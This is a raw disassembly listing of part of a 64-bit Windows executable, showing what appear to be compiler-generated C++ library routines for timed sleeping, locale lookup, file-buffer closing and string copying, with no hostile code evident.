   140006072:	41 5f                	pop    %r15
   140006074:	41 5e                	pop    %r14
   140006076:	5f                   	pop    %rdi
   140006077:	5e                   	pop    %rsi
   140006078:	5d                   	pop    %rbp
   140006079:	c3                   	ret
   14000607a:	e8 31 b3 ff ff       	call   0x1400013b0
   14000607f:	cc                   	int3
   140006080:	e8 0b b2 ff ff       	call   0x140001290
   140006085:	cc                   	int3
   140006086:	cc                   	int3
   140006087:	cc                   	int3
   140006088:	cc                   	int3
   140006089:	cc                   	int3
   14000608a:	cc                   	int3
   14000608b:	cc                   	int3
   14000608c:	cc                   	int3
   14000608d:	cc                   	int3
   14000608e:	cc                   	int3
   14000608f:	cc                   	int3
   140006090:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006095:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000609a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000609f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400060a4:	41 56                	push   %r14
   1400060a6:	48 83 ec 20          	sub    $0x20,%rsp
   1400060aa:	48 8b f9             	mov    %rcx,%rdi
   1400060ad:	48 be 00 00 4f 91 94 	movabs $0x4e94914f0000,%rsi
   1400060b4:	4e 00 00 
   1400060b7:	48 bd db 34 b6 d7 82 	movabs $0x431bde82d7b634db,%rbp
   1400060be:	de 1b 43 
   1400060c1:	49 be f3 8c 90 94 07 	movabs $0xb2f4fc0794908cf3,%r14
   1400060c8:	fc f4 b2 
   1400060cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400060d0:	ff 15 02 31 00 00    	call   *0x3102(%rip)        # 0x1400091d8
   1400060d6:	48 8b d8             	mov    %rax,%rbx
   1400060d9:	ff 15 59 31 00 00    	call   *0x3159(%rip)        # 0x140009238
   1400060df:	48 8b c8             	mov    %rax,%rcx
   1400060e2:	48 81 fb 80 96 98 00 	cmp    $0x989680,%rbx
   1400060e9:	75 06                	jne    0x1400060f1
   1400060eb:	48 6b c1 64          	imul   $0x64,%rcx,%rax
   1400060ef:	eb 71                	jmp    0x140006162
   1400060f1:	48 81 fb 00 36 6e 01 	cmp    $0x16e3600,%rbx
   1400060f8:	75 4a                	jne    0x140006144
   1400060fa:	49 8b c6             	mov    %r14,%rax
   1400060fd:	48 f7 e9             	imul   %rcx
   140006100:	4c 8d 04 11          	lea    (%rcx,%rdx,1),%r8
   140006104:	49 c1 f8 18          	sar    $0x18,%r8
   140006108:	49 8b c0             	mov    %r8,%rax
   14000610b:	48 c1 e8 3f          	shr    $0x3f,%rax
   14000610f:	4c 03 c0             	add    %rax,%r8
   140006112:	49 69 c0 00 36 6e 01 	imul   $0x16e3600,%r8,%rax
   140006119:	48 2b c8             	sub    %rax,%rcx
   14000611c:	49 8b c6             	mov    %r14,%rax
   14000611f:	48 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%rcx,%rcx
   140006126:	48 f7 e9             	imul   %rcx
   140006129:	48 8d 04 11          	lea    (%rcx,%rdx,1),%rax
   14000612d:	48 c1 f8 18          	sar    $0x18,%rax
   140006131:	48 8b c8             	mov    %rax,%rcx
   140006134:	48 c1 e9 3f          	shr    $0x3f,%rcx
   140006138:	48 03 c1             	add    %rcx,%rax
   14000613b:	49 69 c8 00 ca 9a 3b 	imul   $0x3b9aca00,%r8,%rcx
   140006142:	eb 1b                	jmp    0x14000615f
   140006144:	48 99                	cqto
   140006146:	48 f7 fb             	idiv   %rbx
   140006149:	48 8b c8             	mov    %rax,%rcx
   14000614c:	48 69 c2 00 ca 9a 3b 	imul   $0x3b9aca00,%rdx,%rax
   140006153:	48 99                	cqto
   140006155:	48 f7 fb             	idiv   %rbx
   140006158:	48 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%rcx,%rcx
   14000615f:	48 03 c1             	add    %rcx,%rax
   140006162:	48 8b 0f             	mov    (%rdi),%rcx
   140006165:	48 3b c1             	cmp    %rcx,%rax
   140006168:	7d 47                	jge    0x1400061b1
   14000616a:	48 2b c8             	sub    %rax,%rcx
   14000616d:	48 3b ce             	cmp    %rsi,%rcx
   140006170:	7e 11                	jle    0x140006183
   140006172:	ba 00 5c 26 05       	mov    $0x5265c00,%edx
   140006177:	8b ca                	mov    %edx,%ecx
   140006179:	e8 86 0b 00 00       	call   0x140006d04
   14000617e:	e9 4d ff ff ff       	jmp    0x1400060d0
   140006183:	48 8b c5             	mov    %rbp,%rax
   140006186:	48 f7 e9             	imul   %rcx
   140006189:	48 c1 fa 12          	sar    $0x12,%rdx
   14000618d:	48 8b c2             	mov    %rdx,%rax
   140006190:	48 c1 e8 3f          	shr    $0x3f,%rax
   140006194:	48 03 d0             	add    %rax,%rdx
   140006197:	48 69 c2 40 42 0f 00 	imul   $0xf4240,%rdx,%rax
   14000619e:	48 3b c1             	cmp    %rcx,%rax
   1400061a1:	7d 02                	jge    0x1400061a5
   1400061a3:	ff c2                	inc    %edx
   1400061a5:	8b ca                	mov    %edx,%ecx
   1400061a7:	e8 58 0b 00 00       	call   0x140006d04
   1400061ac:	e9 1f ff ff ff       	jmp    0x1400060d0
   1400061b1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400061b6:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400061bb:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400061c0:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1400061c5:	48 83 c4 20          	add    $0x20,%rsp
   1400061c9:	41 5e                	pop    %r14
   1400061cb:	c3                   	ret
   1400061cc:	cc                   	int3
   1400061cd:	cc                   	int3
   1400061ce:	cc                   	int3
   1400061cf:	cc                   	int3
   1400061d0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400061d5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400061da:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400061df:	57                   	push   %rdi
   1400061e0:	48 83 ec 40          	sub    $0x40,%rsp
   1400061e4:	48 8b 05 55 7e 00 00 	mov    0x7e55(%rip),%rax        # 0x14000e040
   1400061eb:	48 33 c4             	xor    %rsp,%rax
   1400061ee:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400061f3:	48 8b e9             	mov    %rcx,%rbp
   1400061f6:	33 d2                	xor    %edx,%edx
   1400061f8:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   1400061fd:	ff 15 e5 2f 00 00    	call   *0x2fe5(%rip)        # 0x1400091e8
   140006203:	90                   	nop
   140006204:	48 8b 05 6d 87 00 00 	mov    0x876d(%rip),%rax        # 0x14000e978
   14000620b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006210:	48 8b 1d f1 2f 00 00 	mov    0x2ff1(%rip),%rbx        # 0x140009208
   140006217:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   14000621b:	75 2d                	jne    0x14000624a
   14000621d:	33 d2                	xor    %edx,%edx
   14000621f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140006224:	ff 15 be 2f 00 00    	call   *0x2fbe(%rip)        # 0x1400091e8
   14000622a:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   14000622e:	75 0f                	jne    0x14000623f
   140006230:	48 8b 05 c9 2f 00 00 	mov    0x2fc9(%rip),%rax        # 0x140009200
   140006237:	ff 00                	incl   (%rax)
   140006239:	48 63 00             	movslq (%rax),%rax
   14000623c:	48 89 03             	mov    %rax,(%rbx)
   14000623f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140006244:	ff 15 96 2f 00 00    	call   *0x2f96(%rip)        # 0x1400091e0
   14000624a:	48 8b 33             	mov    (%rbx),%rsi
   14000624d:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   140006251:	48 8d 3c f5 00 00 00 	lea    0x0(,%rsi,8),%rdi
   140006258:	00 
   140006259:	48 3b 71 18          	cmp    0x18(%rcx),%rsi
   14000625d:	73 0f                	jae    0x14000626e
   14000625f:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140006263:	48 8b 1c 07          	mov    (%rdi,%rax,1),%rbx
   140006267:	48 85 db             	test   %rbx,%rbx
   14000626a:	75 68                	jne    0x1400062d4
   14000626c:	eb 02                	jmp    0x140006270
   14000626e:	33 db                	xor    %ebx,%ebx
   140006270:	80 79 24 00          	cmpb   $0x0,0x24(%rcx)
   140006274:	74 14                	je     0x14000628a
   140006276:	ff 15 7c 2f 00 00    	call   *0x2f7c(%rip)        # 0x1400091f8
   14000627c:	48 3b 70 18          	cmp    0x18(%rax),%rsi
   140006280:	73 0d                	jae    0x14000628f
   140006282:	48 8b 40 10          	mov    0x10(%rax),%rax
   140006286:	48 8b 1c 07          	mov    (%rdi,%rax,1),%rbx
   14000628a:	48 85 db             	test   %rbx,%rbx
   14000628d:	75 45                	jne    0x1400062d4
   14000628f:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   140006294:	48 85 db             	test   %rbx,%rbx
   140006297:	75 3b                	jne    0x1400062d4
   140006299:	48 8b d5             	mov    %rbp,%rdx
   14000629c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400062a1:	ff 15 c1 2f 00 00    	call   *0x2fc1(%rip)        # 0x140009268
   1400062a7:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400062ab:	74 57                	je     0x140006304
   1400062ad:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   1400062b2:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400062b7:	48 8b cb             	mov    %rbx,%rcx
   1400062ba:	e8 05 0a 00 00       	call   0x140006cc4
   1400062bf:	48 8b 03             	mov    (%rbx),%rax
   1400062c2:	48 8b cb             	mov    %rbx,%rcx
   1400062c5:	ff 50 08             	call   *0x8(%rax)
   1400062c8:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   1400062cd:	48 89 1d a4 86 00 00 	mov    %rbx,0x86a4(%rip)        # 0x14000e978
   1400062d4:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   1400062d9:	ff 15 01 2f 00 00    	call   *0x2f01(%rip)        # 0x1400091e0
   1400062df:	48 8b c3             	mov    %rbx,%rax
   1400062e2:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400062e7:	48 33 cc             	xor    %rsp,%rcx
   1400062ea:	e8 d1 0b 00 00       	call   0x140006ec0
   1400062ef:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   1400062f4:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   1400062f9:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   1400062fe:	48 83 c4 40          	add    $0x40,%rsp
   140006302:	5f                   	pop    %rdi
   140006303:	c3                   	ret
   140006304:	e8 27 af ff ff       	call   0x140001230
   140006309:	90                   	nop
   14000630a:	cc                   	int3
   14000630b:	cc                   	int3
   14000630c:	cc                   	int3
   14000630d:	cc                   	int3
   14000630e:	cc                   	int3
   14000630f:	cc                   	int3
   140006310:	40 53                	rex push %rbx
   140006312:	48 83 ec 30          	sub    $0x30,%rsp
   140006316:	48 8b d9             	mov    %rcx,%rbx
   140006319:	48 8b 09             	mov    (%rcx),%rcx
   14000631c:	48 85 c9             	test   %rcx,%rcx
   14000631f:	74 4a                	je     0x14000636b
   140006321:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   140006325:	e8 16 04 00 00       	call   0x140006740
   14000632a:	48 8b 0b             	mov    (%rbx),%rcx
   14000632d:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   140006331:	48 2b d1             	sub    %rcx,%rdx
   140006334:	48 83 e2 e0          	and    $0xffffffffffffffe0,%rdx
   140006338:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000633f:	72 18                	jb     0x140006359
   140006341:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140006345:	48 83 c2 27          	add    $0x27,%rdx
   140006349:	48 2b c8             	sub    %rax,%rcx
   14000634c:	48 83 e9 08          	sub    $0x8,%rcx
   140006350:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140006354:	77 1b                	ja     0x140006371
   140006356:	48 8b c8             	mov    %rax,%rcx
   140006359:	e8 82 0b 00 00       	call   0x140006ee0
   14000635e:	33 c0                	xor    %eax,%eax
   140006360:	48 89 03             	mov    %rax,(%rbx)
   140006363:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140006367:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000636b:	48 83 c4 30          	add    $0x30,%rsp
   14000636f:	5b                   	pop    %rbx
   140006370:	c3                   	ret
   140006371:	33 c0                	xor    %eax,%eax
   140006373:	45 33 c9             	xor    %r9d,%r9d
   140006376:	45 33 c0             	xor    %r8d,%r8d
   140006379:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000637e:	33 d2                	xor    %edx,%edx
   140006380:	33 c9                	xor    %ecx,%ecx
   140006382:	ff 15 48 31 00 00    	call   *0x3148(%rip)        # 0x1400094d0
   140006388:	cc                   	int3
   140006389:	cc                   	int3
   14000638a:	cc                   	int3
   14000638b:	cc                   	int3
   14000638c:	cc                   	int3
   14000638d:	cc                   	int3
   14000638e:	cc                   	int3
   14000638f:	cc                   	int3
   140006390:	48 8b 09             	mov    (%rcx),%rcx
   140006393:	48 85 c9             	test   %rcx,%rcx
   140006396:	74 0b                	je     0x1400063a3
   140006398:	48 8b 01             	mov    (%rcx),%rax
   14000639b:	ba 01 00 00 00       	mov    $0x1,%edx
   1400063a0:	48 ff 20             	rex.W jmp *(%rax)
   1400063a3:	c3                   	ret
   1400063a4:	cc                   	int3
   1400063a5:	cc                   	int3
   1400063a6:	cc                   	int3
   1400063a7:	cc                   	int3
   1400063a8:	cc                   	int3
   1400063a9:	cc                   	int3
   1400063aa:	cc                   	int3
   1400063ab:	cc                   	int3
   1400063ac:	cc                   	int3
   1400063ad:	cc                   	int3
   1400063ae:	cc                   	int3
   1400063af:	cc                   	int3
   1400063b0:	40 53                	rex push %rbx
   1400063b2:	48 83 ec 60          	sub    $0x60,%rsp
   1400063b6:	48 8b 05 83 7c 00 00 	mov    0x7c83(%rip),%rax        # 0x14000e040
   1400063bd:	48 33 c4             	xor    %rsp,%rax
   1400063c0:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   1400063c5:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   1400063ca:	48 8b d9             	mov    %rcx,%rbx
   1400063cd:	0f 84 b0 00 00 00    	je     0x140006483
   1400063d3:	80 79 71 00          	cmpb   $0x0,0x71(%rcx)
   1400063d7:	0f 84 a6 00 00 00    	je     0x140006483
   1400063dd:	48 8b 01             	mov    (%rcx),%rax
   1400063e0:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   1400063e5:	48 89 7c 24 78       	mov    %rdi,0x78(%rsp)
   1400063ea:	ff 50 18             	call   *0x18(%rax)
   1400063ed:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400063f0:	0f 84 89 00 00 00    	je     0x14000647f
   1400063f6:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   1400063fa:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400063ff:	48 8d 53 74          	lea    0x74(%rbx),%rdx
   140006403:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006408:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   14000640d:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140006412:	ff 15 48 2e 00 00    	call   *0x2e48(%rip)        # 0x140009260
   140006418:	85 c0                	test   %eax,%eax
   14000641a:	74 28                	je     0x140006444
   14000641c:	83 e8 01             	sub    $0x1,%eax
   14000641f:	74 27                	je     0x140006448
   140006421:	83 f8 02             	cmp    $0x2,%eax
   140006424:	75 59                	jne    0x14000647f
   140006426:	c6 43 71 00          	movb   $0x0,0x71(%rbx)
   14000642a:	b0 01                	mov    $0x1,%al
   14000642c:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140006431:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140006436:	48 33 cc             	xor    %rsp,%rcx
   140006439:	e8 82 0a 00 00       	call   0x140006ec0
   14000643e:	48 83 c4 60          	add    $0x60,%rsp
   140006442:	5b                   	pop    %rbx
   140006443:	c3                   	ret
   140006444:	c6 43 71 00          	movb   $0x0,0x71(%rbx)
   140006448:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   14000644d:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140006452:	48 2b f8             	sub    %rax,%rdi
   140006455:	74 1f                	je     0x140006476
   140006457:	4c 8b 8b 80 00 00 00 	mov    0x80(%rbx),%r9
   14000645e:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140006463:	4c 8b c7             	mov    %rdi,%r8
   140006466:	ba 01 00 00 00       	mov    $0x1,%edx
   14000646b:	ff 15 0f 31 00 00    	call   *0x310f(%rip)        # 0x140009580
   140006471:	48 3b f8             	cmp    %rax,%rdi
   140006474:	75 09                	jne    0x14000647f
   140006476:	80 7b 71 00          	cmpb   $0x0,0x71(%rbx)
   14000647a:	0f 94 c0             	sete   %al
   14000647d:	eb ad                	jmp    0x14000642c
   14000647f:	32 c0                	xor    %al,%al
   140006481:	eb a9                	jmp    0x14000642c
   140006483:	b0 01                	mov    $0x1,%al
   140006485:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   14000648a:	48 33 cc             	xor    %rsp,%rcx
   14000648d:	e8 2e 0a 00 00       	call   0x140006ec0
   140006492:	48 83 c4 60          	add    $0x60,%rsp
   140006496:	5b                   	pop    %rbx
   140006497:	c3                   	ret
   140006498:	cc                   	int3
   140006499:	cc                   	int3
   14000649a:	cc                   	int3
   14000649b:	cc                   	int3
   14000649c:	cc                   	int3
   14000649d:	cc                   	int3
   14000649e:	cc                   	int3
   14000649f:	cc                   	int3
   1400064a0:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400064a5:	57                   	push   %rdi
   1400064a6:	48 83 ec 20          	sub    $0x20,%rsp
   1400064aa:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   1400064b1:	00 
   1400064b2:	48 8b f9             	mov    %rcx,%rdi
   1400064b5:	74 5e                	je     0x140006515
   1400064b7:	4c 8b 41 18          	mov    0x18(%rcx),%r8
   1400064bb:	48 8d 41 70          	lea    0x70(%rcx),%rax
   1400064bf:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1400064c4:	49 39 00             	cmp    %rax,(%r8)
   1400064c7:	75 20                	jne    0x1400064e9
   1400064c9:	48 8b 91 90 00 00 00 	mov    0x90(%rcx),%rdx
   1400064d0:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   1400064d7:	49 89 08             	mov    %rcx,(%r8)
   1400064da:	2b d1                	sub    %ecx,%edx
   1400064dc:	48 8b 47 38          	mov    0x38(%rdi),%rax
   1400064e0:	48 89 08             	mov    %rcx,(%rax)
   1400064e3:	48 8b 47 50          	mov    0x50(%rdi),%rax
   1400064e7:	89 10                	mov    %edx,(%rax)
   1400064e9:	48 8b cf             	mov    %rdi,%rcx
   1400064ec:	e8 bf fe ff ff       	call   0x1400063b0
   1400064f1:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   1400064f8:	33 db                	xor    %ebx,%ebx
   1400064fa:	84 c0                	test   %al,%al
   1400064fc:	48 0f 45 df          	cmovne %rdi,%rbx
   140006500:	ff 15 ba 30 00 00    	call   *0x30ba(%rip)        # 0x1400095c0
   140006506:	33 f6                	xor    %esi,%esi
   140006508:	85 c0                	test   %eax,%eax
   14000650a:	48 0f 44 f3          	cmove  %rbx,%rsi
   14000650e:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140006513:	eb 02                	jmp    0x140006517
   140006515:	33 f6                	xor    %esi,%esi
   140006517:	48 8b cf             	mov    %rdi,%rcx
   14000651a:	c6 47 7c 00          	movb   $0x0,0x7c(%rdi)
   14000651e:	c6 47 71 00          	movb   $0x0,0x71(%rdi)
   140006522:	ff 15 30 2d 00 00    	call   *0x2d30(%rip)        # 0x140009258
   140006528:	48 8b 0d 51 84 00 00 	mov    0x8451(%rip),%rcx        # 0x14000e980
   14000652f:	48 8b c6             	mov    %rsi,%rax
   140006532:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140006537:	48 89 4f 74          	mov    %rcx,0x74(%rdi)
   14000653b:	48 c7 87 80 00 00 00 	movq   $0x0,0x80(%rdi)
   140006542:	00 00 00 00 
   140006546:	48 c7 47 68 00 00 00 	movq   $0x0,0x68(%rdi)
   14000654d:	00 
   14000654e:	48 83 c4 20          	add    $0x20,%rsp
   140006552:	5f                   	pop    %rdi
   140006553:	c3                   	ret
   140006554:	cc                   	int3
   140006555:	cc                   	int3
   140006556:	cc                   	int3
   140006557:	cc                   	int3
   140006558:	cc                   	int3
   140006559:	cc                   	int3
   14000655a:	cc                   	int3
   14000655b:	cc                   	int3
   14000655c:	cc                   	int3
   14000655d:	cc                   	int3
   14000655e:	cc                   	int3
   14000655f:	cc                   	int3
   140006560:	40 53                	rex push %rbx
   140006562:	48 83 ec 20          	sub    $0x20,%rsp
   140006566:	48 8b d9             	mov    %rcx,%rbx
   140006569:	ff 11                	call   *(%rcx)
   14000656b:	ff 15 b7 2c 00 00    	call   *0x2cb7(%rip)        # 0x140009228
   140006571:	ba 08 00 00 00       	mov    $0x8,%edx
   140006576:	48 8b cb             	mov    %rbx,%rcx
   140006579:	e8 62 09 00 00       	call   0x140006ee0
   14000657e:	33 c0                	xor    %eax,%eax
   140006580:	48 83 c4 20          	add    $0x20,%rsp
   140006584:	5b                   	pop    %rbx
   140006585:	c3                   	ret
   140006586:	cc                   	int3
   140006587:	cc                   	int3
   140006588:	cc                   	int3
   140006589:	cc                   	int3
   14000658a:	cc                   	int3
   14000658b:	cc                   	int3
   14000658c:	cc                   	int3
   14000658d:	cc                   	int3
   14000658e:	cc                   	int3
   14000658f:	cc                   	int3
   140006590:	48 8b c4             	mov    %rsp,%rax
   140006593:	48 89 58 10          	mov    %rbx,0x10(%rax)
   140006597:	48 89 68 18          	mov    %rbp,0x18(%rax)
   14000659b:	48 89 70 20          	mov    %rsi,0x20(%rax)
   14000659f:	57                   	push   %rdi
   1400065a0:	41 54                	push   %r12
   1400065a2:	41 55                	push   %r13
   1400065a4:	41 56                	push   %r14
   1400065a6:	41 57                	push   %r15
   1400065a8:	48 83 ec 50          	sub    $0x50,%rsp
   1400065ac:	49 8b d8             	mov    %r8,%rbx
   1400065af:	4c 8b fa             	mov    %rdx,%r15
   1400065b2:	48 8b f9             	mov    %rcx,%rdi
   1400065b5:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400065b8:	0f 11 40 b8          	movups %xmm0,-0x48(%rax)
   1400065bc:	48 89 58 b8          	mov    %rbx,-0x48(%rax)
   1400065c0:	48 89 58 c0          	mov    %rbx,-0x40(%rax)
   1400065c4:	4c 89 48 c8          	mov    %r9,-0x38(%rax)
   1400065c8:	48 3b ca             	cmp    %rdx,%rcx
   1400065cb:	0f 84 17 01 00 00    	je     0x1400066e8
   1400065d1:	45 33 e4             	xor    %r12d,%r12d
   1400065d4:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   1400065db:	ff ff 7f 
   1400065de:	b9 0a 00 00 00       	mov    $0xa,%ecx
   1400065e3:	49 bd fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%r13
   1400065ea:	ff ff 7f 
   1400065ed:	0f 1f 00             	nopl   (%rax)
   1400065f0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400065f3:	0f 11 03             	movups %xmm0,(%rbx)
   1400065f6:	4c 89 63 10          	mov    %r12,0x10(%rbx)
   1400065fa:	4c 89 63 18          	mov    %r12,0x18(%rbx)
   1400065fe:	4c 8b f7             	mov    %rdi,%r14
   140006601:	48 83 7f 18 07       	cmpq   $0x7,0x18(%rdi)
   140006606:	76 03                	jbe    0x14000660b
   140006608:	4c 8b 37             	mov    (%rdi),%r14
   14000660b:	48 8b 6f 10          	mov    0x10(%rdi),%rbp
   14000660f:	49 3b ed             	cmp    %r13,%rbp
   140006612:	0f 87 18 01 00 00    	ja     0x140006730
   140006618:	48 83 fd 07          	cmp    $0x7,%rbp
   14000661c:	77 18                	ja     0x140006636
   14000661e:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
   140006622:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   140006629:	00 
   14000662a:	41 0f 10 06          	movups (%r14),%xmm0
   14000662e:	0f 11 03             	movups %xmm0,(%rbx)
   140006631:	e9 9c 00 00 00       	jmp    0x1400066d2
   140006636:	48 8b f5             	mov    %rbp,%rsi
   140006639:	48 83 ce 07          	or     $0x7,%rsi
   14000663d:	49 3b f5             	cmp    %r13,%rsi
   140006640:	76 3f                	jbe    0x140006681
   140006642:	49 8b f5             	mov    %r13,%rsi
   140006645:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140006649:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140006650:	72 4e                	jb     0x1400066a0
   140006652:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140006656:	48 3b c1             	cmp    %rcx,%rax
   140006659:	0f 86 cb 00 00 00    	jbe    0x14000672a
   14000665f:	48 8b c8             	mov    %rax,%rcx
   140006662:	e8 81 08 00 00       	call   0x140006ee8
   140006667:	48 8b c8             	mov    %rax,%rcx
   14000666a:	48 85 c0             	test   %rax,%rax
   14000666d:	0f 84 a1 00 00 00    	je     0x140006714
   140006673:	48 83 c0 27          	add    $0x27,%rax
   140006677:	48 83 e0 e0          	and    $0xffffffffffffffe0,%rax
   14000667b:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   14000667f:	eb 24                	jmp    0x1400066a5
   140006681:	48 83 fe 0a          	cmp    $0xa,%rsi
   140006685:	48 0f 42 f1          	cmovb  %rcx,%rsi
   140006689:	48 8d 4e 01          	lea    0x1(%rsi),%rcx
   14000668d:	48 3b c8             	cmp    %rax,%rcx
   140006690:	0f 87 94 00 00 00    	ja     0x14000672a
   140006696:	48 03 c9             	add    %rcx,%rcx
   140006699:	75 ae                	jne    0x140006649
   14000669b:	49 8b c4             	mov    %r12,%rax
   14000669e:	eb 05                	jmp    0x1400066a5
   1400066a0:	e8 43 08 00 00       	call   0x140006ee8
   1400066a5:	48 89 03             	mov    %rax,(%rbx)
   1400066a8:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
   1400066ac:	48 89 73 18          	mov    %rsi,0x18(%rbx)
   1400066b0:	4c 8d 04 6d 02 00 00 	lea    0x2(,%rbp,2),%r8
   1400066b7:	00 
   1400066b8:	49 8b d6             	mov    %r14,%rdx
   1400066bb:	48 8b c8             	mov    %rax,%rcx
   1400066be:	e8 88 18 00 00       	call   0x140007f4b
   1400066c3:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   1400066ca:	ff ff 7f 
   1400066cd:	b9 0a 00 00 00       	mov    $0xa,%ecx
   1400066d2:	48 83 c3 20          	add    $0x20,%rbx
   1400066d6:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1400066db:	48 83 c7 20          	add    $0x20,%rdi
   1400066df:	49 3b ff             	cmp    %r15,%rdi
   1400066e2:	0f 85 08 ff ff ff    	jne    0x1400065f0
   1400066e8:	48 8b d3             	mov    %rbx,%rdx
   1400066eb:	48 8b cb             	mov    %rbx,%rcx
   1400066ee:	e8 4d 00 00 00       	call   0x140006740
   1400066f3:	48 8b c3             	mov    %rbx,%rax
   1400066f6:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   1400066fb:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   1400066ff:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   140006703:	49 8b 73 48          	mov    0x48(%r11),%rsi
   140006707:	49 8b e3             	mov    %r11,%rsp
   14000670a:	41 5f                	pop    %r15
   14000670c:	41 5e                	pop    %r14
   14000670e:	41 5d                	pop    %r13
   140006710:	41 5c                	pop    %r12
   140006712:	5f                   	pop    %rdi
   140006713:	c3                   	ret
   140006714:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140006719:	45 33 c9             	xor    %r9d,%r9d
   14000671c:	45 33 c0             	xor    %r8d,%r8d
   14000671f:	33 d2                	xor    %edx,%edx
   140006721:	33 c9                	xor    %ecx,%ecx
   140006723:	ff 15 a7 2d 00 00    	call   *0x2da7(%rip)        # 0x1400094d0
   140006729:	cc                   	int3
   14000672a:	e8 61 ab ff ff       	call   0x140001290
   14000672f:	cc                   	int3
   140006730:	e8 7b ac ff ff       	call   0x1400013b0
   140006735:	cc                   	int3
   140006736:	cc                   	int3
   140006737:	cc                   	int3
   140006738:	cc                   	int3
   140006739:	cc                   	int3
   14000673a:	cc                   	int3
   14000673b:	cc                   	int3
   14000673c:	cc                   	int3
   14000673d:	cc                   	int3
   14000673e:	cc                   	int3
   14000673f:	cc                   	int3
   140006740:	48 3b ca             	cmp    %rdx,%rcx
   140006743:	74 7d                	je     0x1400067c2
   140006745:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000674a:	57                   	push   %rdi
   14000674b:	48 83 ec 30          	sub    $0x30,%rsp
   14000674f:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140006754:	48 8b fa             	mov    %rdx,%rdi
   140006757:	33 f6                	xor    %esi,%esi
   140006759:	48 8b d9             	mov    %rcx,%rbx
   14000675c:	0f 1f 40 00          	nopl   0x0(%rax)
   140006760:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140006764:	48 83 fa 07          	cmp    $0x7,%rdx
   140006768:	76 31                	jbe    0x14000679b
